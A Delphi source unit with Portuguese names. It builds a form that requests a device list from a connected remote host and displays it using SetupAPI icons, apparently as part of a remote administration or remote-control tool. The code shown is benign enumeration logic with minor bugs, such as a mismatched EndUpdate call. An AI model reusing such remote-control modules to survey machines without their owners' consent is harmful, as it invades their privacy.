unit UnitListarDispositivos;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, ImgList, ExtCtrls, UnitPrincipal;

type
  TFormListarDispositivos = class(TForm)
    tvDevices: TTreeView;
    lvAdvancedInfo: TListView;
    Splitter1: TSplitter;
    ilDevices: TImageList;
    StatusBar1: TStatusBar;
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure lvAdvancedInfoCompare(Sender: TObject; Item1,
      Item2: TListItem; Data: Integer; var Compare: Integer);
    procedure tvDevicesCompare(Sender: TObject; Node1, Node2: TTreeNode;
      Data: Integer; var Compare: Integer);
    procedure tvDevicesChange(Sender: TObject; Node: TTreeNode);
  private
    { Private declarations }
    Servidor: PConexao;
    procedure AtualizarStrings;
    procedure ListarTodosDispositivos(Lista: string);
    procedure ListarDispositivosExtras(TempStr: string);
    procedure InitImageList;
    procedure ReleaseImageList;
    function GetDeviceImageIndex(DeviceGUID: TGUID): Integer;
  public
    { Public declarations }
    procedure OnRead(Recebido: String; ConAux: PConexao); overload;
    constructor Create(aOwner: TComponent; ConAux: PConexao);overload;
  end;

var
  FormListarDispositivos: TFormListarDispositivos;

implementation

{$R *.dfm}

uses
  UnitComandos,
  ListarDispositivos,
  SetupAPI,
  UnitStrings,
  UnitConexao;

constructor TFormListarDispositivos.Create(aOwner: TComponent; ConAux: PConexao);
begin
  inherited Create(aOwner);
  Servidor := ConAux;
end;

procedure TFormListarDispositivos.OnRead(Recebido: String; ConAux: PConexao);
var
  DeviceClassesCount,
  DevicesCount: string;
begin
  if copy(recebido, 1, pos('|', recebido) - 1) = LISTADEDISPOSITIVOSPRONTA then
  begin
    delete(recebido, 1, pos('|', recebido));

    DeviceClassesCount := copy(recebido, 1, pos('|', recebido) - 1);
    delete(recebido, 1, pos('|', recebido));

    DevicesCount := copy(recebido, 1, pos('|', recebido) - 1);
    delete(recebido, 1, pos('|', recebido));

    ListarTodosDispositivos(recebido);

    StatusBar1.Panels[0].Text := traduzidos[234] + ': ' + DeviceClassesCount;
    StatusBar1.Panels[1].Text := traduzidos[235] + ': ' + DevicesCount;
    tvDevices.Enabled := true;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = LISTADEDISPOSITIVOSEXTRASPRONTA then
  begin
    delete(recebido, 1, pos('|', recebido));
    ListarDispositivosExtras(recebido);
    tvDevices.Enabled := true;
  end else




end;

procedure TFormListarDispositivos.AtualizarStrings;
begin
  lvAdvancedInfo.Columns.Items[0].Caption := traduzidos[231];
  lvAdvancedInfo.Columns.Items[1].Caption := traduzidos[232];
end;

procedure TFormListarDispositivos.ListarTodosDispositivos(Lista: string);
var
  dwIndex: DWORD;
  DeviceInfoData: SP_DEVINFO_DATA;
  DeviceName, DeviceClassName: String;
  tvRoot: TTreeNode;
  ClassGUID: TGUID;
  DeviceClassesCount, DevicesCount: Integer;
  tempstr: string;
begin
  tvDevices.Items.BeginUpdate;
  try
    while length(Lista) > 2 do // tamanho #13#10
    begin
      DeviceClassName := copy(Lista, 1, pos(Separador, Lista) - 1);
      delete(Lista, 1, pos(Separador, Lista) + length(Separador) - 1);

      tvRoot := tvDevices.Items.Add(nil, DeviceClassName);

      TempStr := copy(Lista, 1, pos('##' + separador, Lista) - 1);
      delete(Lista, 1, pos('##' + separador, Lista) + 1);
      delete(Lista, 1, length(Separador));

      copymemory(@ClassGUID, @tempstr[1], sizeof(ClassGUID));

      tvRoot.ImageIndex := GetDeviceImageIndex(ClassGUID);
      tvRoot.SelectedIndex := tvRoot.ImageIndex;
      tvRoot.StateIndex := strtoint(copy(Lista, 1, pos(Separador, Lista) - 1));
      delete(Lista, 1, pos(Separador, Lista) + length(Separador) - 1);
      delete(Lista, 1, 2); // #13#10

      while pos('@@', Lista) = 1 do
      begin
        delete(Lista, 1, 2); // '@@'

        DeviceName := copy(Lista, 1, pos(Separador, Lista) - 1);
        delete(Lista, 1, pos(Separador, Lista) + length(Separador) - 1);

        TempStr := copy(Lista, 1, pos('##' + separador, Lista) - 1);
        delete(Lista, 1, pos('##' + separador, Lista) + 1);
        delete(Lista, 1, length(Separador));

        copymemory(@DeviceInfoData.ClassGuid, @tempstr[1], sizeof(DeviceInfoData.ClassGuid));

        dwIndex := strtoint(copy(Lista, 1, pos(Separador, Lista) - 1));
        delete(Lista, 1, pos(Separador, Lista) + length(Separador) - 1);
        delete(Lista, 1, 2); // #13#10

        with tvDevices.Items.AddChild(tvRoot, DeviceName) do
        begin
          ImageIndex := GetDeviceImageIndex(DeviceInfoData.ClassGuid);
          SelectedIndex := ImageIndex;
          StateIndex := Integer(dwIndex);
        end;
      end;
    end;

    tvDevices.AlphaSort;

    finally
    tvDevices.Items.EndUpdate;
  end;
end;

procedure TFormListarDispositivos.ListarDispositivosExtras(TempStr: string);
var
  ANode: TTreeNode;
  Item: TListItem;
begin
  lvAdvancedInfo.Clear;
  lvAdvancedInfo.Items.EndUpdate;
  try
    while length(Tempstr) > 2 do
    begin
      Item := lvAdvancedInfo.Items.Add;
      Item.Caption := copy(TempStr, 1, pos(Separador, Tempstr) - 1);
      delete(TempStr, 1, pos(Separador, Tempstr) + length(Separador) - 1);
      Item.SubItems.Add(copy(TempStr, 1, pos(Separador, Tempstr) - 1));
      delete(TempStr, 1, pos(Separador, Tempstr) + length(Separador) - 1);
      delete(TempStr, 1, 2); // #13#10
    end;
    finally
    lvAdvancedInfo.Items.EndUpdate;
  end;
end;

function TFormListarDispositivos.GetDeviceImageIndex(DeviceGUID: TGUID): Integer;
begin
  Result := -1;
  SetupDiGetClassImageIndex(ClassImageListData, DeviceGUID, Result);
end;

procedure TFormListarDispositivos.InitImageList;
begin
  ZeroMemory(@ClassImageListData, SizeOf(TSPClassImageListData));
  ClassImageListData.cbSize := SizeOf(TSPClassImageListData);
  if SetupDiGetClassImageList(ClassImageListData) then
    ilDevices.Handle := ClassImageListData.ImageList;
end;

procedure TFormListarDispositivos.ReleaseImageList;
begin
  if not SetupDiDestroyClassImageList(ClassImageListData) then
    RaiseLastOSError;
end;

procedure TFormListarDispositivos.FormCreate(Sender: TObject);
begin
  InitImageList;
end;

procedure TFormListarDispositivos.FormShow(Sender: TObject);
begin
  tvDevices.Enabled := true;
  lvAdvancedInfo.Clear;
  tvDevices.Items.Clear;
  AtualizarStrings;
  StatusBar1.Panels[0].Text := Traduzidos[164];
  StatusBar1.Panels[1].Text := Traduzidos[164];
  sleep(10);
  EnviarString(Servidor.Athread, LISTDEVICES + '|', true);
end;

procedure TFormListarDispositivos.lvAdvancedInfoCompare(Sender: TObject;
  Item1, Item2: TListItem; Data: Integer; var Compare: Integer);
begin
  Compare := CompareText(Item1.Caption, Item2.Caption);
end;

procedure TFormListarDispositivos.tvDevicesCompare(Sender: TObject; Node1,
  Node2: TTreeNode; Data: Integer; var Compare: Integer);
begin
  Compare := CompareText(Node1.Text, Node2.Text);
end;

procedure TFormListarDispositivos.tvDevicesChange(Sender: TObject;
  Node: TTreeNode);
var
  ANode: TTreeNode;
begin
  ANode := tvDevices.Selected;
  if Assigned(ANode) then if ANode.StateIndex >= 0 then
  begin
    tvDevices.Enabled := false;
    EnviarString(Servidor.Athread, LISTEXTRADEVICES + '|' + inttostr(ANode.StateIndex) + '|', true);
  end;
end;

end.
